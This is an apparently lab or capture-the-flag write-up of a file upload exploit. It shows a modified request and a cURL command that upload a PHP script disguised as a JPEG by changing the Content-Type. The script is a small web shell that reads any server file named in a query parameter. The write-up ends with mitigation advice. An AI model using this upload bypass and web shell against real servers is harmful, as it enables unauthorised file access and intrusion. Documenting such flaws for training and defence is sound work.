# Write-Up: File Upload Exploit

## Exploit Overview

The vulnerability exploited here is related to insecure file upload handling. By intercepting the POST request used to upload a file, we can modify the `Content-Type` header to bypass weak MIME type validation on the server.

### Steps to Exploit

1. Intercept the POST request for file upload using a tool like Burp Suite or similar.
2. Change the `Content-Type` from `application/x-php` (indicating a PHP script) to `image/jpeg` (indicating an image file).
3. Submit the modified request.

Here is the intercepted and modified POST request:

```
POST /?page=upload HTTP/1.1
Host: 192.168.1.33
Content-Length: 597
Cache-Control: max-age=0
Accept-Language: fr-FR,fr;q=0.9
Origin: http://192.168.1.33
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNHtXWgyPKt1jS4A8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.33/?page=upload
Accept-Encoding: gzip, deflate, br
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Connection: keep-alive

------WebKitFormBoundaryNHtXWgyPKt1jS4A8
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryNHtXWgyPKt1jS4A8
Content-Disposition: form-data; name="uploaded"; filename="test.php"
Content-Type: application/x-php (!!!ICI!!!)

<?php
if (isset($_GET['file'])) {
    echo file_get_contents($_GET['file']);
} else {
    echo "Veuillez fournir un fichier avec ?file=chemin_du_fichier.";
}
?>

------WebKitFormBoundaryNHtXWgyPKt1jS4A8
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryNHtXWgyPKt1jS4A8--
```
#### Exploit via cURL

To exploit this vulnerability directly via cURL:

```bash
curl -X POST "http://192.168.1.33/?page=upload" \
-H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNHtXWgyPKt1jS4A8" \
-F "MAX_FILE_SIZE=100000" \
-F "uploaded=@test.php;type=image/jpeg" \
-F "Upload=Upload"
```

### Key Points in cURL Command:

- **`-X POST`**: Specifies the HTTP POST method.
- **`-H "Content-Type"`**: Sets the boundary for the multipart form data.
- **`-F`**: Sends form fields; `uploaded=@test.php` attaches the malicious file, faked as an image by specifying `type=image/jpeg`.



### Explanation

1. The `Content-Type` was modified from `application/x-php` to `image/jpeg`.
2. The uploaded file, while disguised as an image, contains executable PHP code.
3. If the server does not properly validate the file type and executes the script, the payload is successful.

## Vulnerability Description

This vulnerability arises from insufficient validation of user-uploaded files. While the application performs some checks, they are based solely on the MIME type provided in the HTTP headers, which can be easily manipulated.

### Key Points

- **Manipulable MIME Type:** The `Content-Type` header in the HTTP request can be manually altered.
- **Insufficient Server Validation:** The server does not validate the actual file content or extension.
- **Potential for Code Execution:** The uploaded file can execute malicious code, leading to unauthorized access or further exploitation.

## Mitigation Strategies

To prevent this type of attack, consider implementing the following measures:

1. **Server-Side Validation:**

   - Verify file extensions and MIME types.
   - Perform content inspection of the uploaded file to ensure it matches the expected format.

2. **Restrict Executable File Uploads:**

   - Block potentially dangerous file types like `.php`, `.exe`, `.js`, etc.

3. **File Storage:**

   - Store uploaded files in a directory that is not web-accessible.
   - Rename uploaded files to remove any executable extensions.


